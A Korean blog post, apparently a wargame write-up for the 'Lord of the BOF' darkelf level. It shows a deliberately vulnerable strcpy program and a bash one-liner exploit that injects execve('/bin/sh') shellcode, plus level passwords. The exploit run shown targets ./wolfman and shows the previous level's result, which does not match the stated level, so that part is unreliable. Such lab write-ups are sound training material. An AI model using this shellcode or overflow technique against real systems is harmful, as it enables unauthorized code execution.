---
layout: post
title: "[Wargame] 해커스쿨 BoF LEVEL6 (wolfman -> darkelf) : check length of argv[1] + egghunter + bufferhunter"
date: 2015-11-07 23:50
comments: true
categories:  wargame
tags: [bof]
---

- id = wolfman 
- pw = love eyuna  

<!--more-->

단계가 지날수록 제한조건이 하나씩 추가되는구나...

이번에는 `argv[1]` 사이즈가 48보다 작아야 하고, buffer 앞의 40bytes 는 clear 시킨다. 그렇다면 shellcode 는 두 번째 argument 로 넣고, `LR` 값은 두 번째 argument 있는 위치를 가르키도록 하면 되지 않을까...

```c
/*
        The Lord of the BOF : The Fellowship of the BOF
        - darkelf
        - egghunter + buffer hunter + check length of argv[1]
*/

#include <stdio.h>
#include <stdlib.h>

extern char **environ;

main(int argc, char *argv[])
{
        char buffer[40];
        int i;

        if(argc < 2){
                printf("argv error\n");
                exit(0);
        }

        // egghunter
        for(i=0; environ[i]; i++)
                memset(environ[i], 0, strlen(environ[i]));

        if(argv[1][47] != '\xbf')
        {
                printf("stack is still your friend.\n");
                exit(0);
        }

        // check the length of argument
        if(strlen(argv[1]) > 48){
                printf("argument is too long!\n");
                exit(0);
        }

        strcpy(buffer, argv[1]);
        printf("%s\n", buffer);

        // buffer hunter
        memset(buffer, 0, 40);
} 
```

## Exploit

![img](https://raw.githubusercontent.com/humb1ec0ding/humb1ec0ding-etc/master/2015/11/stage6.png)

```bash
[NOP 44bytes][LR][NOP 20bytes][ShellCode]

./wolfman `python -c 'print "\x90"*44 + "\xe4\xfd\xff\xbf"'`  `python -c 'print "\x90"*30 + "\xeb\x18\x5e\x31\xc0\x88\x46\x07\x89\x76\x08\x89\x46\x0c\xb0\x0b\x8d\x1e\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"'`
```

## Next stage

```bash
bash$ id °
uid=504(orc) gid=504(orc) euid=505(wolfman) egid=505(wolfman) groups=504(orc)

bash$ my-pass
euid = 505
love eyuna 
```